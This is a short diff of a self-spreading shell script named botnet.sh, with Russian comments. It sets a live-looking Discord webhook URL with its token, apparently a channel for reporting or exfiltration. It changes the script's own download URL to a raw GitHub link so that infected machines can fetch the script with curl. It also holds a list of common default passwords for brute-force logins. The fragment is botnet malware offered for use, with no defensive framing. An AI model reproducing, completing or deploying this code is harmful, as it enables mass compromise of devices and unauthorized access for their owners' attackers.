@@ -8,7 +8,7 @@
 WEBHOOK="https://discord.com/api/webhooks/1574870843085955124/RYOu5Y9Xv-9bjUAzqpfV6po-gRqUchf1RpjktbQKWE6MeTS6QDtkH_dXm7y_abW6stPQ"
 
 # Ссылка на этот же скрипт (используем curl, он есть везде)
-BOT_URL="https://github.com/traiantadgs-ops/exe/blob/main/botnet.sh"
+BOT_URL="https://raw.githubusercontent.com/traiantadgs-ops/exe/main/botnet.sh"
 
 # Пароли (добавь свои, если знаешь общие дефолтные)
 PASSWORDS="admin password root 123456 letmein default administrator"
